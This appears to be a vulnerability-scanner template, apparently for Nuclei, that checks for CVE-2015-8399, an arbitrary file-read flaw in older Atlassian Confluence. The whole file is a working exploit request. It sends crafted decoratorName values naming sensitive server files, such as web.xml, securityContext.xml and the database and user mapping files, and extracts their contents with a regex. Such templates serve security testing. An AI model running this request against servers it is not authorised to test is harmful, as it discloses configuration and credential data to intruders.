id: confluence-viewdecorator-action-file-read-cve-2015-8399

info:
  name: Confluence Viewdecorator.action File Read (CVE-2015-8399)
  author: ProjectDiscoveryAI
  severity: high
  description: |
    CVE-2015-8399, there is an arbitrary file enumeration read vulnerability in Atlassian Confluence
    versions before 5.8.17. Attackers can use this vulnerability to enumerate and read files on the server.
  tags: file-inclusion
  reference:
    - http://www.securityfocus.com/archive/1/537232/100/0/threaded
    - https://www.exploit-db.com/exploits/39170/
    - https://nvd.nist.gov/vuln/detail/CVE-2015-8399
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8399
  classification:
    cve-id: CVE-2015-8399

variables:
  file_path: |
    /WEB-INF/web.xml
    /WEB-INF/decorators.xml
    /WEB-INF/glue-config.xml
    /WEB-INF/server-config.wsdd
    /WEB-INF/sitemesh.xml
    /WEB-INF/urlrewrite.xml
    /databaseSubsystemContext.xml
    /securityContext.xml
    /services/statusServiceContext.xml
    /com/atlassian/confluence/security/SpacePermission.hbm.xml
    /com/atlassian/confluence/user/OSUUser.hbm.xml
    /com/atlassian/confluence/security/ContentPermissionSet.hbm.xml
    /com/atlassian/confluence/user/ConfluenceUser.hbm.xml

http:
  - raw:
      - |
        GET /spaces/viewdefaultdecorator.action?decoratorName={{file_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<code>"
          - "log4j.properties<br"
        part: body

    extractors:
      - type: regex
        name: file_content
        group: 1
        part: body
        regex:
          - "(?s)<code>(.*?)</code>"
